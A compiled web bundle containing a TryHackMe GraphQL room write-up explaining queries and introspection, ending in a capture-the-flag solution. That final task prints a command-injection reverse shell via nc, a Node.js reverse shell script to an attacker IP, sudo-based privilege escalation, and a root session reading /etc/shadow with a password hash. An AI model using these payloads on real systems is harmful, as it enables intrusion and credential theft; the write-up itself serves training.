"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[6424],{3905:(e,t,n)=>{n.d(t,{Zo:()=>u,kt:()=>m});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function i(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function o(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?i(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):i(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},i=Object.keys(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);for(a=0;a<i.length;a++)n=i[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var s=a.createContext({}),p=function(e){var t=a.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):o(o({},t),e)),n},u=function(e){var t=p(e.components);return a.createElement(s.Provider,{value:t},e.children)},h="mdxType",c={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},d=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,i=e.originalType,s=e.parentName,u=l(e,["components","mdxType","originalType","parentName"]),h=p(n),d=r,m=h["".concat(s,".").concat(d)]||h[d]||c[d]||i;return n?a.createElement(m,o(o({ref:t},u),{},{components:n})):a.createElement(m,o({ref:t},u))}));function m(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var i=n.length,o=new Array(i);o[0]=d;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l[h]="string"==typeof e?e:r,o[1]=l;for(var p=2;p<i;p++)o[p]=n[p];return a.createElement.apply(null,o)}return a.createElement.apply(null,n)}d.displayName="MDXCreateElement"},43497:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>s,contentTitle:()=>o,default:()=>c,frontMatter:()=>i,metadata:()=>l,toc:()=>p});var a=n(87462),r=(n(67294),n(3905));const i={},o="GraphQL",l={unversionedId:"Tryhackme/GraphQL/Graphql",id:"Tryhackme/GraphQL/Graphql",title:"GraphQL",description:"A room detailing GraphQL and how it can be used for exploitation",source:"@site/writeups/Tryhackme/GraphQL/Graphql.md",sourceDirName:"Tryhackme/GraphQL",slug:"/Tryhackme/GraphQL/",permalink:"/writeups/Tryhackme/GraphQL/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Gotta Catch'em All!",permalink:"/writeups/Tryhackme/Gotta Catchem All/Gotta Catch em All"},next:{title:"HA Joker CTF",permalink:"/writeups/Tryhackme/HA Joker CTF/"}},s={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Intro",id:"task-1-intro",level:2},{value:"Task 2 What is GraphQL",id:"task-2-what-is-graphql",level:2},{value:"Task 3 How GraphQL works",id:"task-3-how-graphql-works",level:2},{value:"Task 4 How to extract sensitive information from GraphQL",id:"task-4-how-to-extract-sensitive-information-from-graphql",level:2},{value:"Task 5 A note on GraphIQL",id:"task-5-a-note-on-graphiql",level:2},{value:"Task 6 Challenge",id:"task-6-challenge",level:2}],u={toc:p},h="wrapper";function c(e){let{components:t,...n}=e;return(0,r.kt)(h,(0,a.Z)({},u,n,{components:t,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"graphql"},"GraphQL"),(0,r.kt)("p",null,"A room detailing GraphQL and how it can be used for exploitation"),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/graphql"},"GraphQL")),(0,r.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"GraphQL Fundamentals"),(0,r.kt)("li",{parentName:"ul"},"GraphQL Exploitation")),(0,r.kt)("h2",{id:"task-1-intro"},"Task 1 Intro"),(0,r.kt)("p",null,"The purpose of this room is to show how a malicious user could use GraphQL to perform unintended actions. You will get the most out of this room if you have some programming experience, as code examples will be shown."),(0,r.kt)("p",null,"With that in mind, let's get on with the room!"),(0,r.kt)("p",null,"Read the above."),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,r.kt)("h2",{id:"task-2-what-is-graphql"},"Task 2 What is GraphQL"),(0,r.kt)("p",null,"GraphQL is a way to interact with APIs. It is not a database, nor a database language, it is simply a way to interact with APIs.  For example let's say you were trying to figure out the nutritional information of a box of cereal given that cereal's name."),(0,r.kt)("p",null,"In a normal REST api, you might do something like this"),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"curl cereal.api -d \"title='Lucky Charms'\"")),(0,r.kt)("p",null,"and you would receive a JSON response looking like"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-json"},'{\n    "sugar": "50000000g"\n    "protein": "0g"\n    ...\n}\n')),(0,r.kt)("p",null,"In GraphQL, your query would look like this"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-ruby"},'{\n    Cereal(name: "Lucky Charms")\n    {\n        sugar\n        protein\n    }\n}\n')),(0,r.kt)("p",null,"Note: you can still use curl with GraphQL, you would just need to URL encode this into something that curl would accept."),(0,r.kt)("p",null,"and your output would look like "),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/bjg60rQ.png",alt:null})),(0,r.kt)("p",null,"It's important to note that GraphQL isn't inherently vulnerable, however since we have the ability to pass data to an API, all of the same injection techniques still apply. However GraphQL specifically does give us some information that we can use to help aid our efforts, and we'll learn more about that in the upcoming tasks"),(0,r.kt)("p",null,"Read the above."),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,r.kt)("h2",{id:"task-3-how-graphql-works"},"Task 3 How GraphQL works"),(0,r.kt)("p",null,"In order to properly understand how to use the information that GraphQL gives us, we need to know how to write a query. In essence, a GraphQL query works like this."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-ruby"},"{\n    <type>  {\n        field,\n        field,\n        ...\n    }\n}\n")),(0,r.kt)("p",null,"Let's take a look at the developer side of things to visualize how that works, to do this we'll be using the Cereal code from the previous task."),(0,r.kt)("p",null,(0,r.kt)("em",{parentName:"p"},"All code examples are in NodeJS, using Express")),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/mY2wEae.png",alt:null})),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"schema"),' is where we define the types we are able to use, as well the fields of those types. "Query" is the root type, anything put in here we are allowed to use in our query. In this type we state that we want the ability to use the object Cereal in our query, we want it to take an argument called name, and we want it to be of Type Cereal. In an actual query that looks like this.'),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/7IvqEYE.png",alt:null})),(0,r.kt)("p",null,"We provided the name of the object we defined in query, and the argument we specified that it should take."),(0,r.kt)("p",null,"Next we have the type Cereal, here we define all of the fields that can return data in our response."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/i3Z7PIe.png",alt:null})),(0,r.kt)("p",null,"In an actual query that would look like this. "),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/uoaRrov.png",alt:null})),(0,r.kt)("p",null,"We specified that sugar and protein are valid data fields, and we can see that they return data. You may have noticed that name is not part of the query, that is because we are not required to specify all of the fields, we can get as much or as little information as we need!"),(0,r.kt)("p",null,"Next we are defining the data that can be returned by the query."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/Ur2I1um.png",alt:null})),(0,r.kt)("p",null,"From a developers stand point, this shows us how we can return data, and it's in pretty much the exact same as JSON. We can change and manipulate this data as needed."),(0,r.kt)("p",null,"Next we define the function that does all of the work."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/CsrVsKM.png",alt:null})),(0,r.kt)("p",null,'This code takes the input that we provide in our query, goes through our cereal array, and checks if a valid cereal name is in the array. If we were to make a query with the input  Cereal(name: "Cinnamon Toast Crunch") it would take that name value and return'),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/18FZ6XL.png",alt:null})),(0,r.kt)("p",null,"Which is the exact format that GraphQL expects to return data in."),(0,r.kt)("p",null,"Next we have the root variable."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/TrUq4GO.png",alt:null})),(0,r.kt)("p",null,"This is pretty simple, it tells GraphQL that whenever it's dealing with the Cereal object, to use the getCereal function."),(0,r.kt)("p",null,"All of this allows us to make this query and receive this output."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/ttPvDBe.png",alt:null})),(0,r.kt)("p",null,'For a final go through, it works like this. We use the object Cereal, and provide an input of "Cinnamon Toast Crunch". Then we request that we want to know how much sugar and how much protein is in the cereal. The API takes our input, puts it in the getCereal function and returns our output.'),(0,r.kt)("p",null,"Given the object Dog, with a parameter of name, how would you query the weight for a Shiba Inu."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-ruby"},'{ Dog(name:"Shiba Inu") { weight }}\n')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},'{ Dog(name:"Shiba Inu") { weight }}')),(0,r.kt)("h2",{id:"task-4-how-to-extract-sensitive-information-from-graphql"},"Task 4 How to extract sensitive information from GraphQL"),(0,r.kt)("p",null,"One great benefit is that GraphQL effectively documents itself. GraphQL comes bundled with certain objects, types, and fields that allow us to get information on all the other types, fields, and objects."),(0,r.kt)("p",null,"From the perspective of a Penetration Tester, this means that we aren't going into this fully blind, with a regular API we may just have to guess and pray at endpoints and parameters if there's no publicly available documentation, however GraphQL gives us this information. Let's take a look at just how that works."),(0,r.kt)("p",null,"Documentation on the built-in types can be found ",(0,r.kt)("a",{parentName:"p",href:"https://graphql.org/learn/introspection"},"here")),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/7lifZSB.png",alt:null})),(0,r.kt)("p",null,"Let's go through this query, recall that in the code, we defined all of our types in the schema method. GraphQL actually documents this, through the ",(0,r.kt)("inlineCode",{parentName:"p"},"__schema")," object, which contains information about all the types we defined. Next we want to know about types, so we query the field ",(0,r.kt)("inlineCode",{parentName:"p"},"types"),". From there all we need to do is query the name and description of those types which gives us the output shown below."),(0,r.kt)("p",null,"It's pretty intuitive, we're requesting information on all of the types that GraphQL has, it just so happens that it shows us types that we created. Just by looking at it, we can tell that Cereal is a pretty suspicious type, let's request more information about it."),(0,r.kt)("p",null,(0,r.kt)("img",{parentName:"p",src:"https://i.imgur.com/hHezcjc.png",alt:null})),(0,r.kt)("p",null,"We can use the build in object ",(0,r.kt)("inlineCode",{parentName:"p"},"__type")," to do this, we use the name parameter to specify which type we want more information on. From there we can query what the fields are for whatever type we can specify, and then we can get the name of all of those fields."),(0,r.kt)("p",null,"Now we know all of the fields we can query. With a typical REST API, getting this much information could have taken quite a while in fuzzing! Overall introspection is a useful way to get additional information on the API and how it works."),(0,r.kt)("p",null,"Note: There are a lot more fields with a lot more technical information that you can obtain. If you don't want to build a query yourself, ",(0,r.kt)("a",{parentName:"p",href:"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection"},"here")," is a link to a github repo that contains some of those queries."),(0,r.kt)("p",null,"How would I get the name of every field for the type Linux."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-ruby"},'{\n    __type:(name: "Linux"){\n        fields {\n            name\n        }\n    }\n}\n')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},'{ __type:(name: "Linux"){ fields { name } } }')),(0,r.kt)("h2",{id:"task-5-a-note-on-graphiql"},"Task 5 A note on GraphIQL"),(0,r.kt)("p",null,"The interface that you've been seeing me use is called GraphIQL. It's effectively just a graphical web interface to make GraphQL queries, which is installed alongside the NodeJS GraphQL module and can only make queries to the server on which it is installed. Because of this, when you're pentesting GraphQL, you may not have access to GraphIQL. In this case you may need to URL encode your queries and manually make a post request using a tool like CuRL, like you would with any other API."),(0,r.kt)("p",null,"Note:  While GraphIQL is exclusive to your server, there is a chrome/firefox extension that acts as a client to other servers called ",(0,r.kt)("a",{parentName:"p",href:"https://altair.sirmuel.design/"},"Altair"),"."),(0,r.kt)("p",null,"Read the above."),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,r.kt)("h2",{id:"task-6-challenge"},"Task 6 Challenge"),(0,r.kt)("p",null,"You will be given a completely blank GraphIQL interface with no additional information. Your job is to get the hash of the user para."),(0,r.kt)("p",null,"What is the hash of the user para"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-ruby"},"{ __schema {types {name description } } }\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-json"},'{\n  "data": {\n    "__schema": {\n      "types": [\n        {\n          "name": "Query",\n          "description": null\n        },\n        {\n          "name": "String",\n          "description": "The `String` scalar type represents textual data, represented as UTF-8 character sequences. The String type is most often used by GraphQL to represent free-form human-readable text."\n        },\n        {\n          "name": "Ping",\n          "description": null\n        },\n        {\n          "name": "Boolean",\n          "description": "The `Boolean` scalar type represents `true` or `false`."\n        },\n        {\n          "name": "__Schema",\n          "description": "A GraphQL Schema defines the capabilities of a GraphQL server. It exposes all available types and directives on the server, as well as the entry points for query, mutation, and subscription operations."\n        },\n        {\n          "name": "__Type",\n          "description": "The fundamental unit of any GraphQL Schema is the type. There are many kinds of types in GraphQL as represented by the `__TypeKind` enum.\\n\\nDepending on the kind of a type, certain fields describe information about that type. Scalar types provide no information beyond a name, description and optional `specifiedByUrl`, while Enum types provide their values. Object and Interface types provide the fields they describe. Abstract types, Union and Interface, provide the Object types possible at runtime. List and NonNull types compose other types."\n        },\n        {\n          "name": "__TypeKind",\n          "description": "An enum describing what kind of type a given `__Type` is."\n        },\n        {\n          "name": "__Field",\n          "description": "Object and Interface types are described by a list of Fields, each of which has a name, potentially a list of arguments, and a return type."\n        },\n        {\n          "name": "__InputValue",\n          "description": "Arguments provided to Fields or Directives and the input fields of an InputObject are represented as Input Values which describe their type and optionally a default value."\n        },\n        {\n          "name": "__EnumValue",\n          "description": "One possible value for a given Enum. Enum values are unique values, not a placeholder for a string or numeric value. However an Enum value is returned in a JSON response as a string."\n        },\n        {\n          "name": "__Directive",\n          "description": "A Directive provides a way to describe alternate runtime execution and type validation behavior in a GraphQL document.\\n\\nIn some cases, you need to provide options to alter GraphQL\'s execution behavior in ways field arguments will not suffice, such as conditionally including or skipping a field. Directives provide this by describing additional information to the executor."\n        },\n        {\n          "name": "__DirectiveLocation",\n          "description": "A Directive can be adjacent to many parts of the GraphQL language, a __DirectiveLocation describes one such possible adjacencies."\n        }\n      ]\n    }\n  }\n}\n')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-ruby"},'{ Ping(ip: "; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 9001 >/tmp/f") { ip output } }\n')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"para@ubuntu:~$ sudo -l\nMatching Defaults entries for para on ubuntu:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser para may run the following commands on ubuntu:\n    (ALL : ALL) NOPASSWD: /usr/bin/node /home/para/server.js\n")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://gist.github.com/mitchmoser/f6df9b7de4e6785ed66fd86082d02d69#file-celestial-reverse-shell-decoded"},"Celestial reverse shell decoded")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre",className:"language-js"},"var net = require('net');\nvar spawn = require('child_process').spawn;\nHOST=\"10.8.106.222\";\nPORT=\"9002\";\nTIMEOUT=\"5000\";\nif (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }                                      \nfunction c(HOST,PORT) {\n    var client = new net.Socket();\n    client.connect(PORT, HOST, function() {\n        var sh = spawn('/bin/sh',[]);\n        client.write(\"Connected!\\n\");\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n        sh.on('exit',function(code,signal){\n          client.end(\"Disconnected!\\n\");\n        });\n    });\n    client.on('error', function(e) {\n        setTimeout(c(HOST,PORT), TIMEOUT);\n    });\n}\nc(HOST,PORT);\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"para@ubuntu:~$ cp server.js server.js.old\npara@ubuntu:~$ rm -r server.js\npara@ubuntu:~$ nano server.js\npara@ubuntu:~$ sudo /usr/bin/node /home/para/server.js\n\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/GraphQL$ nc -lnvp 9002\nListening on 0.0.0.0 9002\nConnection received on 10.10.236.40 40028\nConnected!\nid\nuid=0(root) gid=0(root) groups=0(root)\ncat /etc/shadow | grep para\npara:$1$CHyLRSmg$QAvdWTC70dsIHuM5KmTf20:18535:0:99999:7:::\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"$1$CHyLRSmg$QAvdWTC70dsIHuM5KmTf20")))}c.isMDXComponent=!0}}]);